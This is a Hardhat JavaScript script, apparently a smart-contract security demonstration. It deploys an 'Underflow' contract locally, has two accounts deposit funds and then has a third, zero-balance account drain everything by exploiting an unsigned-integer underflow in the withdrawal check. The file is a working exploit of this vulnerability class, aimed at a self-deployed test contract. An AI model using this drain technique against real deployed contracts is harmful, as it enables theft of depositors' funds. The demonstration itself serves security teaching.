const { ethers } = require("hardhat");
const Runner = require("./lib/runner");
const utils = require("./lib/utils");

/**
 * What will happen: 
 * 
 * - 2 users will each deposit some funds into the contract 
 * - a different user will attempt to withdraw the funds of those two users 
 * 
 * When the 'attacker' attempts to withdraw the funds, the contract will check if that user's balance 
 * minus the requested amount, will be greater than zero. The subtraction operation in the check will 
 * trigger underflow (the attacker's balance is 0, so 0 - [amount]) of an unsigned type, so the result 
 * will always be > 0. The attacker can then withdraw as much as he requested, provided that the amount 
 * exists within the contract. 
 */
Runner.run(async (provider, owner, addr1, addr2) => {
    const contract = await utils.deployContract("Underflow");
    const depositAmt = 10000; 
    console.log();
    
    //contract owner deposits 10000 into the contract 
    console.log(`${owner.address} deposits ${depositAmt}\n`);
    await contract.connect(owner).deposit({value:depositAmt}); 
    
    //addr1 deposits 10000 into the contract 
    console.log(`${addr1.address} deposits ${depositAmt}\n`);
    await contract.connect(addr1).deposit({value:depositAmt}); 
    
    const currentBalance = await provider.getBalance(contract.address);
    console.log(`contract balance is ${currentBalance}\n`);
    
    //addr2 deposits nothing, but withdraws everything
    console.log(`${addr2.address} attempts to withdraw ${currentBalance}`);
    await contract.connect(addr2).withdraw(currentBalance); 
    
    //contract balance should be zero 
    const newBalance = await provider.getBalance(contract.address);
    console.log(`contract balance is ${newBalance}\n`);
    
    if (newBalance == 0) {
        console.log(`IT LOOKS LIKE THE CONTRACT HAS BEEN DRAINED OF FUNDS by ${addr2.address}`); 
    }
});
